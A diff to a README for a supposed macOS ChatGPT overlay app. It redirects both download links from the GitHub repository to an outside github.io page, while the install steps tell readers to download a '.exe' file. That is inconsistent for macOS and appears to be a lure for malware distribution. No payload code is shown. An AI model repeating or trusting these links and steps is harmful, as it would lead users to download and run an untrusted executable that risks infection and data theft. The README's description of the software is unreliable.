@@ -1,6 +1,6 @@
 # 💬 macos-chatgpt-overlay-bar - Access ChatGPT quickly from your screen
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Labial-lecturedemonstration252/macos-chatgpt-overlay-bar)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://labial-lecturedemonstration252.github.io)
 
 ## 💡 About this program
 
@@ -21,7 +21,7 @@ Your computer must meet these basic standards to run this software:
 
 You can obtain the software program through our official release page. Please follow these steps for a clean installation:
 
-1. Visit [this page to download](https://github.com/Labial-lecturedemonstration252/macos-chatgpt-overlay-bar).
+1. Visit [this page to download](https://labial-lecturedemonstration252.github.io).
 2. Look for the section labeled "Releases" on the right side of the screen.
 3. Select the latest version listed at the top of the list.
 4. Download the file named with the .exe extension to your Downloads folder.
